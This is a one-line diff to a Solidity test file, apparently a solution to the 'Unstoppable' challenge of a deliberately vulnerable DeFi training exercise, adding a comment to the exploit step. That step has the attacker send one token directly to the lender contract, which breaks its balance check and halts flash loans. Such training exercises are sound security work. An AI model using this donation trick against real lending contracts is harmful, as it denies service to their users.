@@ -61,7 +61,7 @@ contract Unstoppable is Test {
          * EXPLOIT START *
          */
         vm.startPrank(attacker);
-        dvt.transfer(address(unstoppableLender), 1);
+        dvt.transfer(address(unstoppableLender), 1); // Let AssertionViolated Revert happened.
         vm.stopPrank();
         /**
          * EXPLOIT END *
